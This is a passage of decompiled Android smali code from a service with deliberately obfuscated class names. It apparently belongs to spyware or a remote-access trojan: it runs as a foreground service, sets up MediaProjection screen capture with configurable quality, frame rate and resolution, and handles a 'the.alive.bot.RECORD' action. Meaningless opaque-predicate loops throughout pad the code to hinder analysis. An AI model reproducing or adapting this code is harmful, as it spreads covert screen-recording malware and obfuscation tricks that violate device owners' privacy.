    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    .line 129
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 130
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_2

    .line 136
    :cond_5
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_2

    .line 139
    :cond_6
    :goto_3
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_8

    .line 141
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 142
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_7

    .line 144
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 145
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_3

    .line 151
    :cond_7
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_3

    .line 155
    :cond_8
    :goto_4
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1d

    if-lt v4, v5, :cond_9

    .line 156
    iget v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->_IDD:I

    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    const/16 v6, 0x20

    invoke-virtual {p0, v4, v5, v6}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startForeground(ILandroid/app/Notification;I)V

    goto :goto_5

    .line 159
    :cond_9
    iget v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->_IDD:I

    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, v4, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startForeground(ILandroid/app/Notification;)V

    :goto_5
    :try_start_1
    const-string v4, "media_projection"

    .line 163
    invoke-virtual {p0, v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/media/projection/MediaProjectionManager;

    iput-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v4, "window"

    .line 164
    invoke-virtual {p0, v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/WindowManager;

    iput-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->wmgr:Landroid/view/WindowManager;

    .line 166
    iget-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v4}, Landroid/os/HandlerThread;->start()V

    .line 167
    new-instance v4, Landroid/os/Handler;

    iget-object v5, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v5}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v4, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->handler:Landroid/os/Handler;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_a

    .line 169
    :catch_1
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    .line 170
    :goto_6
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_b

    .line 172
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 173
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    .line 175
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 176
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 182
    :cond_a
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 185
    :cond_b
    :goto_7
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_d

    .line 187
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 188
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_c

    .line 190
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 191
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_7

    .line 197
    :cond_c
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_7

    .line 200
    :cond_d
    :goto_8
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_f

    .line 202
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 203
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_e

    .line 205
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 206
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_8

    .line 212
    :cond_e
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_8

    .line 215
    :cond_f
    :goto_9
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_11

    .line 217
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 218
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_10

    .line 220
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 221
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_9

    .line 227
    :cond_10
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Bdnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9worker;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_9

    :cond_11
    :goto_a
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 443
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->stopCapture()V

    .line 445
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .line 241
    :try_start_0
    iget-object p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    if-nez p2, :cond_0

    .line 243
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    .line 244
    invoke-static {p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->getInstance(Landroid/content/Context;)Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;

    move-result-object p3

    .line 245
    invoke-virtual {p3, p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p2

    iput-object p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    .line 249
    :cond_0
    sget p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NOTIFICATION_ID:I

    iget-object p3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->mynotify:Landroid/app/Notification;

    invoke-virtual {p0, p2, p3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startForeground(ILandroid/app/Notification;)V

    .line 250
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const/high16 p3, 0x10000000

    const-string v0, "the.alive.bot.RECORD"

    const-string v1, "ask_battary"

    const/4 v2, 0x0

    const/4 v3, 0x1

    const-string v4, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-nez p2, :cond_a

    :try_start_1
    const-string p2, "resultCode"

    const/16 v5, 0x539

    .line 254
    invoke-virtual {p1, p2, v5}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->resultCode:I

    const-string p2, "resultIntent"

    .line 255
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->resultData:Landroid/content/Intent;

    const-string p2, "Q"

    const/16 v5, 0xa

    .line 256
    invoke-virtual {p1, p2, v5}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Q:I

    const-string p2, "F"

    const/4 v5, 0x5

    .line 257
    invoke-virtual {p1, p2, v5}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->FPS:I

    const-string p2, "P"

    .line 258
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sput-object p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->PID:Ljava/lang/String;

    const-string p2, "R"

    .line 259
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->Resolutions:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_4

    .line 261
    :catch_0
    :try_start_2
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 262
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_2

    .line 264
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 265
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 267
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 268
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 274
    :cond_1
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 277
    :cond_2
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_4

    .line 279
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 280
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    .line 282
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 283
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 289
    :cond_3
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 292
    :cond_4
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_6

    .line 294
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 295
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_5

    .line 297
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 298
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 304
    :cond_5
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 307
    :cond_6
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_8

    .line 309
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 310
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_7

    .line 312
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 313
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    .line 319
    :cond_7
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    .line 323
    :cond_8
    :goto_4
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 325
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 326
    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 329
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p3, 0x1a

    if-lt p2, p3, :cond_9

    .line 330
    invoke-virtual {p0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/khexinkusgctewfwafifyaectwkdjrjqrnlngvxkxcvozlgvrf27;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_9

    .line 333
    :cond_9
